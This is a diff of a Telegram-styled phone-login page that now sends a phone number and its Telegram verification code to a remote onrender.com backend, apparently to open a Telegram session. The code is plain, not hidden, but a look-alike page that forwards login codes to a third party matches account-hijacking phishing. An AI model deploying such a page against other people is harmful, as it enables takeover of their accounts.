@@ -3,11 +3,11 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Telegram Style Login</title>
+  <title>Telegram Phone Login</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #f0f0f0;
+      background: #f2f2f2;
       display: flex;
       align-items: center;
       justify-content: center;
@@ -15,117 +15,115 @@
       margin: 0;
     }
     .container {
-      background: #fff;
+      background: white;
       padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      border-radius: 10px;
+      box-shadow: 0px 4px 10px rgba(0,0,0,0.1);
       width: 300px;
-      text-align: center;
     }
-    h2 {
-      color: #0088cc;
-    }
-    .input-group {
-      margin: 15px 0;
-      text-align: left;
-    }
-    .input-group label {
-      font-size: 14px;
-    }
-    .input-group input {
+    input {
       width: 100%;
       padding: 10px;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      font-size: 16px;
+      margin-top: 10px;
+      margin-bottom: 20px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
     }
-    .btn {
+    button {
+      width: 100%;
+      padding: 10px;
       background: #0088cc;
       color: white;
-      padding: 10px;
       border: none;
-      border-radius: 8px;
-      width: 100%;
-      margin-top: 10px;
-      font-size: 16px;
+      border-radius: 5px;
       cursor: pointer;
     }
-    .btn:hover {
-      background: #007ab8;
+    button:hover {
+      background: #007bb5;
+    }
+    .hidden {
+      display: none;
+    }
+    .message {
+      margin-top: 10px;
+      font-size: 14px;
+      color: green;
+    }
+    .error {
+      color: red;
     }
   </style>
 </head>
 <body>
+  <div class="container">
+    <h3>Telegram Login</h3>
+    <input type="text" id="phone" placeholder="Phone Number" />
+    <button onclick="sendCode()">Send Code</button>
 
-<div class="container" id="login-step">
-  <h2>Login</h2>
-  <div class="input-group">
-    <label for="phone">Phone Number</label>
-    <input type="tel" id="phone" placeholder="+91 98765 43210" />
+    <div id="code-section" class="hidden">
+      <input type="text" id="code" placeholder="Enter Code" />
+      <button onclick="verifyCode()">Verify Code</button>
+    </div>
+
+    <div id="message" class="message"></div>
   </div>
-  <button class="btn" onclick="sendCode()">Next</button>
-</div>
 
-<div class="container" id="otp-step" style="display:none;">
-  <h2>Enter Code</h2>
-  <p>Code sent to <span id="show-phone"></span></p>
-  <div class="input-group">
-    <label for="otp">Telegram Code</label>
-    <input type="text" id="otp" placeholder="12345" />
-  </div>
-  <button class="btn" onclick="verifyCode()">Verify</button>
-</div>
+  <script>
+    const backendBaseURL = "https://telegram-backend-o5bg.onrender.com";
 
-<div class="container" id="success-step" style="display:none;">
-  <h2>✅ Login Successful</h2>
-  <p>Telegram session started!</p>
-</div>
-
-<script>
-  let userPhone = '';
-
-  function sendCode() {
-    const phone = document.getElementById('phone').value.trim();
-    if (!phone) {
-      alert("Please enter a valid phone number.");
-      return;
+    async function sendCode() {
+      const phone = document.getElementById("phone").value;
+      const message = document.getElementById("message");
+      message.textContent = "";
+      try {
+        const res = await fetch(\`\${backendBaseURL}/send-code\`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({ phone }),
+        });
+        const data = await res.json();
+        if (data.success) {
+          document.getElementById("code-section").classList.remove("hidden");
+          message.textContent = "Code sent!";
+          message.classList.remove("error");
+        } else {
+          message.textContent = "Error sending code";
+          message.classList.add("error");
+        }
+      } catch (err) {
+        message.textContent = "Error: " + err.message;
+        message.classList.add("error");
+      }
     }
 
-    fetch('http://localhost:5000/send-code', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ phone })
-    })
-    .then(res => res.json())
-    .then(data => {
-      if (data.success) {
-        userPhone = phone;
-        document.getElementById('show-phone').textContent = phone;
-        document.getElementById('login-step').style.display = 'none';
-        document.getElementById('otp-step').style.display = 'block';
-      } else {
-        alert("Failed to send code");
+    async function verifyCode() {
+      const phone = document.getElementById("phone").value;
+      const code = document.getElementById("code").value;
+      const message = document.getElementById("message");
+      message.textContent = "";
+      try {
+        const res = await fetch(\`\${backendBaseURL}/verify-code\`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({ phone, code }),
+        });
+        const data = await res.json();
+        if (data.success) {
+          message.textContent = "Login successful!";
+          message.classList.remove("error");
+        } else {
+          message.textContent = "Invalid code";
+          message.classList.add("error");
+        }
+      } catch (err) {
+        message.textContent = "Error: " + err.message;
+        message.classList.add("error");
       }
-    });
-  }
-
-  function verifyCode() {
-    const otp = document.getElementById('otp').value.trim();
-    fetch('http://localhost:5000/verify-code', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ phone: userPhone, code: otp })
-    })
-    .then(res => res.json())
-    .then(data => {
-      if (data.success) {
-        document.getElementById('otp-step').style.display = 'none';
-        document.getElementById('success-step').style.display = 'block';
-      } else {
-        alert("Invalid code");
-      }
-    });
-  }
-</script>
+    }
+  </script>
 </body>
 </html>
